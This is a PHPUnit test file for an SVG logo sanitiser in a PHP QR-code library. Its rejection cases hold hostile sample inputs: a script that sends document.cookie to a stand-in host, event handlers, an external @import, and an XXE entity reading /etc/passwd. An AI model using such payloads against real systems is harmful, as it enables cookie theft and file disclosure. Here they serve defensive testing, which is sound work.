<?php

declare(strict_types=1);

namespace Redcodede\QrGen\Tests\Qr\Logo;

use PHPUnit\Framework\TestCase;
use Redcodede\QrGen\Qr\Exception\LogoRejected;
use Redcodede\QrGen\Qr\Logo\SvgLogo;

/**
 * An SVG is a document, not an image. It can carry script, event handlers,
 * external references and entity declarations, and a logo arrives from outside
 * — an upload, a client delivery, a designer's export.
 *
 * These tests are the argument that the sanitiser is a whitelist rather than a
 * list of things someone happened to think of: the output is rebuilt from
 * parsed tokens, so anything not recognised cannot appear in it.
 */
final class SvgLogoTest extends TestCase
{
    private function wrap(string $inner, string $rootAttributes = 'viewBox="0 0 100 50"'): string
    {
        return '<svg xmlns="http://www.w3.org/2000/svg" ' . $rootAttributes . '>' . $inner . '</svg>';
    }

    public function testItReadsTheIntrinsicSizeFromTheViewBox(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap('<path d="M0 0h1v1z"/>'));

        self::assertSame(100.0, $logo->width());
        self::assertSame(50.0, $logo->height());
    }

    /**
     * The viewBox wins, because width and height may carry units while the
     * viewBox is always in user units — and user units are what a transform
     * scales.
     */
    public function testTheViewBoxWinsOverWidthAndHeight(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap(
            '<path d="M0 0h1v1z"/>',
            'width="999px" height="111px" viewBox="0 0 100 50"'
        ));

        self::assertSame(100.0, $logo->width());
        self::assertSame(50.0, $logo->height());
    }

    public function testWidthAndHeightStandInWhenThereIsNoViewBox(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap('<path d="M0 0h1v1z"/>', 'width="64mm" height="32mm"'));

        self::assertSame(64.0, $logo->width());
        self::assertSame(32.0, $logo->height());
    }

    public function testArtworkWithoutAnyDimensionIsRefused(): void
    {
        $this->expectException(LogoRejected::class);
        $this->expectExceptionMessage('neither a viewBox nor a width and height');

        SvgLogo::fromMarkup($this->wrap('<path d="M0 0h1v1z"/>', ''));
    }

    /**
     * The shape every Illustrator export has: a stylesheet of single class
     * selectors, nowadays tucked inside <defs>. Refusing it would refuse every
     * real logo, so it is inlined — and the block, the class and the now-empty
     * <defs> all disappear.
     */
    public function testAnIllustratorStylesheetIsInlinedIntoPresentationAttributes(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap(
            '<defs><style>.st0 { fill: #e2b0d1; }</style></defs>'
            . '<path class="st0" d="M0 0h1v1z"/>'
        ));

        self::assertSame('<path d="M0 0h1v1z" fill="#e2b0d1"/>', $logo->markup());
    }

    public function testAStylesheetAtTopLevelWorksTheSameWay(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap(
            '<style type="text/css">.a{fill:#009879;}.b{fill:#9D9D9C;}</style>'
            . '<path class="a" d="M0 0h1v1z"/><path class="b" d="M1 1h1v1z"/>'
        ));

        self::assertSame(
            '<path d="M0 0h1v1z" fill="#009879"/><path d="M1 1h1v1z" fill="#9D9D9C"/>',
            $logo->markup()
        );
    }

    /**
     * The other shape Illustrator writes: one rule for every element that
     * shares a fill. It says nothing a repeated rule would not say, so it is
     * inlined the same way.
     */
    public function testAGroupedClassSelectorAppliesToEveryClassInIt(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap(
            '<style>.cls-1,.cls-2 , .cls-3{fill:#e2b0d1;}</style>'
            . '<path class="cls-1" d="M0 0h1v1z"/>'
            . '<path class="cls-2" d="M1 1h1v1z"/>'
            . '<path class="cls-3" d="M2 2h1v1z"/>'
        ));

        self::assertSame(
            '<path d="M0 0h1v1z" fill="#e2b0d1"/>'
            . '<path d="M1 1h1v1z" fill="#e2b0d1"/>'
            . '<path d="M2 2h1v1z" fill="#e2b0d1"/>',
            $logo->markup()
        );
    }

    /**
     * A class named twice keeps both rules, and the later declaration wins per
     * property. That is what a browser does with the same file.
     */
    public function testALaterRuleOverridesTheGroupedOnePerProperty(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap(
            '<style>.a,.b{fill:#111111;stroke:#222222;}.b{fill:#333333;}</style>'
            . '<path class="a" d="M0 0h1v1z"/><path class="b" d="M1 1h1v1z"/>'
        ));

        self::assertStringContainsString('<path d="M0 0h1v1z" fill="#111111" stroke="#222222"/>', $logo->markup());
        self::assertStringContainsString('<path d="M1 1h1v1z" fill="#333333" stroke="#222222"/>', $logo->markup());
    }

    /**
     * One unusable part poisons the group. Half a rule applied is worse than
     * none: the file would come out looking almost right.
     */
    public function testAGroupWithSomethingOtherThanAClassIsRefused(): void
    {
        $this->expectException(LogoRejected::class);
        $this->expectExceptionMessage('cannot inline');

        SvgLogo::fromMarkup($this->wrap(
            '<style>.a, path{fill:#000;}</style><path class="a" d="M0 0h1v1z"/>'
        ));
    }

    /**
     * CSS order: a class rule beats a presentation attribute, an inline style
     * beats both.
     */
    public function testPaintIsResolvedInCssOrder(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap(
            '<style>.c{fill:#222222;}</style>'
            . '<path d="M0 0h1v1z" fill="#111111" class="c" style="fill:#333333"/>'
        ));

        self::assertStringContainsString('fill="#333333"', $logo->markup());
        self::assertStringNotContainsString('#111111', $logo->markup());
        self::assertStringNotContainsString('#222222', $logo->markup());
    }

    /**
     * Identifiers are removed rather than renamed. Without them there is
     * nothing to collide when two symbols share a page, and no reference for a
     * url() to resolve against.
     */
    public function testIdentifiersAreRemoved(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap('<g id="Layer_1"><path id="p1" d="M0 0h1v1z"/></g>'));

        self::assertSame('<g><path d="M0 0h1v1z"/></g>', $logo->markup());
    }

    public function testCommentsAreRemoved(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap('<!-- Generator: Adobe Illustrator --><path d="M0 0h1v1z"/>'));

        self::assertSame('<path d="M0 0h1v1z"/>', $logo->markup());
    }

    public function testTitleAndDescriptionAreDroppedWithTheirText(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap(
            '<title>Logo</title><desc>Created by someone</desc><path d="M0 0h1v1z"/>'
        ));

        self::assertSame('<path d="M0 0h1v1z"/>', $logo->markup());
    }

    public function testNestedGroupsSurvive(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap('<g><g transform="translate(1 2)"><path d="M0 0h1v1z"/></g></g>'));

        self::assertSame('<g><g transform="translate(1 2)"><path d="M0 0h1v1z"/></g></g>', $logo->markup());
    }

    public function testTheSameInputAlwaysProducesTheSameBytes(): void
    {
        $source = $this->wrap('<path stroke="#000" d="M0 0h1v1z" fill="#fff" stroke-width="2"/>');

        self::assertSame(
            SvgLogo::fromMarkup($source)->markup(),
            SvgLogo::fromMarkup($source)->markup()
        );
    }

    public function testAttributeValuesAreEscaped(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap('<path d="M0 0h1v1z" fill="#fff&amp;"/>'));

        self::assertStringContainsString('&amp;', $logo->markup());
        self::assertStringNotContainsString('fill="#fff&"', $logo->markup());
    }

    /**
     * Everything below is refused rather than stripped. Quietly removing what
     * we do not understand would either change the artwork without telling
     * anyone or leave a remnant nobody considered.
     *
     * @dataProvider refusedArtwork
     */
    public function testDangerousOrUnsupportedArtworkIsRefused(string $inner, string $expectedMessage): void
    {
        $this->expectException(LogoRejected::class);
        $this->expectExceptionMessage($expectedMessage);

        SvgLogo::fromMarkup($this->wrap($inner));
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function refusedArtwork(): iterable
    {
        yield 'script element' => [
            '<script>fetch("https://evil.example/"+document.cookie)</script><path d="M0 0h1v1z"/>',
            'uses <script>',
        ];

        yield 'event handler' => [
            '<path d="M0 0h1v1z" onload="alert(1)"/>',
            'attribute "onload"',
        ];

        yield 'embedded image' => [
            '<image href="https://evil.example/pixel.png" width="10" height="10"/>',
            'uses <image>',
        ];

        yield 'text element' => [
            '<text x="0" y="0">Marke</text>',
            'uses <text>',
        ];

        yield 'use reference' => [
            '<use href="#somewhere"/><path d="M0 0h1v1z"/>',
            'uses <use>',
        ];

        yield 'foreign object' => [
            '<foreignObject><body>hi</body></foreignObject><path d="M0 0h1v1z"/>',
            'uses <foreignobject>',
        ];

        yield 'animation' => [
            '<path d="M0 0h1v1z"><animate attributeName="fill" to="#000"/></path>',
            'uses <animate>',
        ];

        yield 'link' => [
            '<a href="https://evil.example/"><path d="M0 0h1v1z"/></a>',
            'uses <a>',
        ];

        yield 'gradient in defs' => [
            '<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><path d="M0 0h1v1z"/>',
            'non-empty <defs>',
        ];

        yield 'url reference in fill' => [
            '<path d="M0 0h1v1z" fill="url(#g)"/>',
            'reach outside the file',
        ];

        yield 'xlink href' => [
            '<path d="M0 0h1v1z" xlink:href="https://evil.example/"/>',
            'attribute "xlink:href"',
        ];

        yield 'data uri in style' => [
            '<path d="M0 0h1v1z" style="fill:url(data:image/svg+xml;base64,AAA)"/>',
            'reach outside the file',
        ];

        yield 'at rule in stylesheet' => [
            '<style>@import url("https://evil.example/x.css");</style><path d="M0 0h1v1z"/>',
            'cannot inline',
        ];

        yield 'element selector in stylesheet' => [
            '<style>path { fill: #000; }</style><path d="M0 0h1v1z"/>',
            'cannot inline',
        ];

        yield 'unknown css property' => [
            '<style>.a{behavior:url(x.htc);}</style><path class="a" d="M0 0h1v1z"/>',
            'cannot inline',
        ];

        yield 'loose text content' => [
            'Marke<path d="M0 0h1v1z"/>',
            'text content',
        ];

        yield 'nothing drawable' => [
            '<g></g>',
            'no drawable element',
        ];

        yield 'unbalanced tags' => [
            '<path d="M0 0h1v1z"/></g>',
            'unbalanced',
        ];

        yield 'unknown attribute' => [
            '<path d="M0 0h1v1z" requiredExtensions="urn:x"/>',
            'attribute "requiredextensions"',
        ];
    }

    /**
     * Entity declarations are where billion laughs and local file disclosure
     * start, so the document is refused before anything else looks at it.
     */
    public function testADoctypeWithAnInternalSubsetIsRefused(): void
    {
        $this->expectException(LogoRejected::class);
        $this->expectExceptionMessage('internal subset');

        SvgLogo::fromMarkup(
            '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            . $this->wrap('<path d="M0 0h1v1z"/>')
        );
    }

    public function testMarkupWithoutAnSvgRootIsRefused(): void
    {
        $this->expectException(LogoRejected::class);
        $this->expectExceptionMessage('no <svg> root');

        SvgLogo::fromMarkup('<path d="M0 0h1v1z"/>');
    }

    public function testSeveralSvgElementsAreRefused(): void
    {
        $this->expectException(LogoRejected::class);
        $this->expectExceptionMessage('more than one <svg>');

        SvgLogo::fromMarkup($this->wrap('<svg viewBox="0 0 1 1"><path d="M0 0h1v1z"/></svg>'));
    }

    /**
     * The one property that makes the whole approach worth trusting: the result
     * is written from recognised tokens, so a construct the parser missed
     * cannot survive into the output.
     */
    public function testTheOutputCarriesNothingButWhitelistedMarkup(): void
    {
        $logo = SvgLogo::fromMarkup($this->wrap(
            '<defs><style>.st0{fill:#e2b0d1;}</style></defs>'
            . '<!-- Generator --><title>x</title>'
            . '<g id="Ebene_1"><path class="st0" d="M0 0h1v1z"/><circle cx="5" cy="5" r="2" class="st0"/></g>'
        ));

        self::assertSame(
            '<g><path d="M0 0h1v1z" fill="#e2b0d1"/><circle cx="5" cy="5" r="2" fill="#e2b0d1"/></g>',
            $logo->markup()
        );
    }
}
